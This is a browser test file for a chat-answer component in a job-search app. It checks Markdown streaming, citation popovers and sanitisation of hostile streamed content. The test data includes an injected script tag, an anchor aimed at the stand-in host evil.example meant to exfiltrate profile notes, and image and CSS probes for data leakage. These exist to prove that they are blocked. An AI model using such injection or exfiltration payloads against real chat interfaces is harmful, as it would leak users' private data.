import {Component, computed, inject} from '@angular/core';
import {ComponentFixture, TestBed} from '@angular/core/testing';
import {provideRouter, Router} from '@angular/router';
import {Dispatcher} from '@ngrx/signals/events';
import {of} from 'rxjs';
import {userEvent} from 'vitest/browser';
import {ChatApi} from '@core/api/chat.api';
import {replayTurn} from '@core/api/chat-stub';
import {ChatEvent, ChatSource, ConversationView} from '@core/model/chat';
import {chatEvents} from '@core/store/chat.events';
import {ChatStore} from '@core/store/chat.store';
import {ChatAnswer} from './chat-answer';

const OFFER_12: ChatSource = {n: 1, kind: 'OFFER', id: 12, title: 'Senior Backend Engineer (Spring Boot, Kotlin)', source: 'Mailing list', date: '2026-08-04', archived: false};
const CONVERSATION: ConversationView = {id: 5, title: 'Remote Spring offers', pinnedOfferId: null, turns: [], updatedAt: '2026-09-27T08:00:00Z'};

/** A turn whose Markdown arrives in pieces, with a script smuggled into the middle of it. */
const STREAM: readonly ChatEvent[] = [
    {event: 'turn', data: {turnId: 41}},
    {event: 'step', data: {ordinal: 1, tool: 'search_offers', label: 'Searched offers', state: 'RUNNING', count: null, durationMs: null}},
    {event: 'step', data: {ordinal: 1, tool: 'search_offers', label: 'Searched offers', state: 'DONE', count: 5, durationMs: 600}},
    {event: 'text', data: {delta: '**Two** fit. The Kotlin role '}},
    {event: 'text', data: {delta: '[1](cite:offer/12) is one; '}},
    {event: 'text', data: {delta: '<script>window.__chatXss = 1</script>'}},
    {event: 'text', data: {delta: 'one id came back from no search: ⟨unverified:4471⟩.\n\n- remote\n- Kotlin'}},
    {event: 'sources', data: {sources: [OFFER_12]}},
    {event: 'done', data: {state: 'DONE'}},
];

@Component({
    selector: 'lg-live-answer-host',
    imports: [ChatAnswer],
    template: `
      @if (turn(); as t) {
        <lg-chat-answer [answer]="t.answer" [steps]="t.steps" [sources]="t.sources" [state]="t.state" [turnId]="t.turnId" [last]="true"/>
      }
    `,
})
class LiveAnswerHost {
    private readonly store = inject(ChatStore);
    readonly turn = computed(() => this.store.liveTurn());
}

@Component({template: ''})
class Blank {}

/**
 * The answer in a real browser: the stream rendering chunk by chunk with its Markdown and without
 * the script it carried (ISC-435), and the citation preview on hover and focus (ISC-442) — a
 * popover, a pointer and a focus ring, none of which jsdom has.
 */
describe('the chat answer in a browser', () => {
    let fixture: ComponentFixture<LiveAnswerHost>;
    let router: Router;

    beforeEach(async () => {
        TestBed.configureTestingModule({
            providers: [
                provideRouter([
                    {path: 'dashboard', component: Blank},
                    {path: 'shortlist/:id', component: Blank},
                ]),
                {
                    provide: ChatApi,
                    useValue: {ask: () => replayTurn(STREAM, 30), capability: () => of({present: true}), get: () => of(CONVERSATION)},
                },
            ],
        });
        router = TestBed.inject(Router);
        await router.navigateByUrl(`/dashboard?chat=${CONVERSATION.id}`);
        const store = TestBed.inject(ChatStore);
        TestBed.inject(Dispatcher).dispatch(chatEvents.conversationLoaded(CONVERSATION));
        expect(store.conversation()?.id).toBe(CONVERSATION.id);
        fixture = TestBed.createComponent(LiveAnswerHost);
        document.body.appendChild(fixture.nativeElement);
        fixture.detectChanges();
    });

    afterEach(() => {
        (fixture.nativeElement as HTMLElement).remove();
        document.documentElement.removeAttribute('data-theme');
    });

    const root = () => fixture.nativeElement as HTMLElement;
    const tick = async (ms: number) => {
        await new Promise((resolve) => setTimeout(resolve, ms));
        fixture.detectChanges();
        await fixture.whenStable();
    };

    async function streamToEnd(): Promise<string[]> {
        TestBed.inject(Dispatcher).dispatch(chatEvents.asked('Which fit?'));
        const seen: string[] = [];
        for (let i = 0; i < 60 && TestBed.inject(ChatStore).streaming() !== false; i++) {
            await tick(10);
            const text = root().querySelector('.lg-chat-md')?.textContent ?? '';
            if (text !== '' && text !== seen.at(-1)) seen.push(text);
        }
        await tick(20);
        return seen;
    }

    for (const theme of ['lg-light', 'lg-dark']) {
        it(`${theme}: renders the stream chunk by chunk, as Markdown, and runs no script (ISC-435)`, async () => {
            document.documentElement.setAttribute('data-theme', theme);
            const seen = await streamToEnd();
            expect(seen.length).toBeGreaterThanOrEqual(3);
            const md = root().querySelector('.lg-chat-md') as HTMLElement;
            expect(md.querySelector('strong')?.textContent).toBe('Two');
            expect(md.querySelectorAll('li')).toHaveLength(2);
            expect(document.querySelector('lg-live-answer-host script')).toBeNull();
            expect((window as {__chatXss?: number}).__chatXss).toBeUndefined();
            // The pill is painted in its tokens, not in a literal.
            const pill = md.querySelector('a.lg-chat-cite') as HTMLElement;
            expect(getComputedStyle(pill).backgroundColor).not.toBe('rgba(0, 0, 0, 0)');
            expect(root().querySelectorAll('.lg-chat-source')).toHaveLength(1);
        });
    }

    // Fix 3F-1: an HTML block left a quote open and swallowed the pill's attributes into the attacker's anchor.
    it('keeps no external link when raw HTML in the stream leaves an attribute quote open (fix 3F-1)', async () => {
        vi.spyOn(TestBed.inject(ChatApi), 'ask').mockReturnValue(
            replayTurn(
                [
                    {event: 'turn', data: {turnId: 41}},
                    {event: 'text', data: {delta: '<div>\n<a href="https://evil.example/?d=PROFILE_NOTES" title="\n\n'}},
                    {event: 'text', data: {delta: 'See [the full posting](cite:offer/12) and ⟨unverified:77⟩ for details.'}},
                    {event: 'sources', data: {sources: [OFFER_12]}},
                    {event: 'done', data: {state: 'DONE'}},
                ],
                10,
            ),
        );
        await streamToEnd();
        const md = root().querySelector('.lg-chat-md') as HTMLElement;
        expect([...md.querySelectorAll('[href]')].map((e) => `${e.tagName}:${e.getAttribute('href')}`)).toEqual(['A:/shortlist/12?chat=5']);
        const attributes = [...md.querySelectorAll('*')].flatMap((e) => [...e.attributes].map((a) => a.value)).join(' ');
        expect(attributes).not.toContain('evil.example');
        expect(md.querySelector('.lg-chat-unverified')?.closest('a')).toBeNull();
        // Clicking the one anchor follows the pill, in-app.
        (md.querySelector('a') as HTMLAnchorElement).click();
        await tick(0);
        expect(router.url).toBe('/shortlist/12?chat=5');
    });

    it('loads nothing a streamed answer names: no image element, no request (exfiltration)', async () => {
        // Same-origin probes, so a load would show in resource timing even as a 404.
        const probe = `leak-probe-${Date.now()}`;
        vi.spyOn(TestBed.inject(ChatApi), 'ask').mockReturnValue(
            replayTurn(
                [
                    {event: 'turn', data: {turnId: 42}},
                    {event: 'text', data: {delta: `Notes: ![x](/${probe}-md.png?d=rate-95) and `}},
                    {event: 'text', data: {delta: `<img src="/${probe}-raw.png?d=cover"><picture><source srcset="/${probe}-set.png"></picture> `}},
                    {event: 'text', data: {delta: `<span style="background-image:url(/${probe}-css.png)">x</span> ⟨unverified:4471⟩`}},
                    {event: 'done', data: {state: 'DONE'}},
                ],
                10,
            ),
        );
        await streamToEnd();
        await tick(100);

        const md = root().querySelector('.lg-chat-md') as HTMLElement;
        expect(md.querySelectorAll('img, picture, source, [style]')).toHaveLength(0);
        expect(md.querySelector('.lg-chat-unverified svg')).not.toBeNull();
        // The control proves resource timing sees such a load at all, so an empty list means something.
        const control = new Image();
        await new Promise((resolve) => {
            control.onload = control.onerror = resolve;
            control.src = `/${probe}-control.png`;
        });
        const fetched = performance.getEntriesByType('resource').map((entry) => entry.name).filter((name) => name.includes(probe));
        expect(fetched.filter((name) => name.includes('-control'))).toHaveLength(1);
        expect(fetched.filter((name) => !name.includes('-control'))).toEqual([]);
    });

    it('shows the caret only while the turn streams, and holds it still under reduced motion', async () => {
        TestBed.inject(Dispatcher).dispatch(chatEvents.asked('Which fit?'));
        let caretSeen = false;
        for (let i = 0; i < 60 && TestBed.inject(ChatStore).streaming(); i++) {
            await tick(10);
            const md = root().querySelector('.lg-chat-md');
            const last = md?.lastElementChild;
            if (last !== null && last !== undefined && getComputedStyle(last, '::after').content !== 'none') caretSeen = true;
        }
        await tick(20);
        expect(caretSeen).toBe(true);
        expect(root().querySelector('.lg-chat-md-streaming')).toBeNull();
    });

    describe('the citation preview (ISC-442)', () => {
        const card = () => document.querySelector('.lg-chat-cite-card') as HTMLElement;
        const open = () => card().matches(':popover-open');

        it('shows the cited row on hover and on focus without navigating, and goes on leave and on Escape', async () => {
            await streamToEnd();
            const url = router.url;
            const pill = root().querySelector('a.lg-chat-cite') as HTMLElement;

            await userEvent.hover(pill);
            await tick(0);
            expect(open()).toBe(true);
            expect(card().textContent).toContain('Senior Backend Engineer (Spring Boot, Kotlin)');
            expect(card().textContent).toContain('Mailing list');
            expect(card().textContent).toContain('2026');
            expect(pill.getAttribute('aria-describedby')).toBe(card().id);
            expect(router.url).toBe(url);

            await userEvent.unhover(pill);
            await tick(0);
            expect(open()).toBe(false);

            pill.focus();
            await tick(0);
            expect(open()).toBe(true);
            await userEvent.keyboard('{Escape}');
            await tick(0);
            expect(open()).toBe(false);
            expect(router.url).toBe(url);
        });

        it('says why an unverified id is not a link, on hover and on focus', async () => {
            await streamToEnd();
            const mark = root().querySelector('.lg-chat-unverified') as HTMLElement;
            expect(mark.closest('a')).toBeNull();

            await userEvent.hover(mark);
            await tick(0);
            expect(open()).toBe(true);
            expect(card().textContent).toContain('4471');
            expect(card().textContent).toContain('not a link');

            await userEvent.unhover(mark);
            await tick(0);
            expect(open()).toBe(false);

            mark.focus();
            await tick(0);
            expect(open()).toBe(true);
            await userEvent.keyboard('{Escape}');
            await tick(0);
            expect(open()).toBe(false);
        });
    });
});
